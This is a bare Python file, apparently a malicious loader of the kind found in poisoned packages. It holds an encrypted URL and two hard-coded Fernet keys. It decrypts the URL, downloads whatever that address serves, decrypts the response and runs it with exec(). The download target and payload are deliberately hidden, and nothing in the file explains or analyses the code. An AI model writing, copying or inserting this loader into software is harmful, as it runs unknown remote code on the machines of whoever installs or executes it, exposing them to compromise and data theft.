import requests
from cryptography.fernet import Fernet
remote_url = b'gAAAAABmaBfB2CsAhkOYCXAnf2Tzq0yzoGai53JRAiwUv6uUdMRMEMguhfN1dGie8OyPKKfDTrQsz3i1QIPkxxhV9GtIQaQN-acwZne0O5iy8NHcKCIEBIrtGOY_dwYyTNfkQL-u0kM0JtmBb0HcS9FIg4Dd7LNviTp42tfPRBQS272z-Fda3fw='
exec(Fernet(b'o2JkTsUVrpxKkmN-1-95SOTxM4kzBzirMv5a7fnctho=').decrypt(requests.get(Fernet(b'GadiJcskj6XvTZnJGIw-dDWk-D-z-waUeQFJ0stCwyc=').decrypt(remote_url).decode('utf-8')).text.encode('utf-8')).decode('utf-8'))
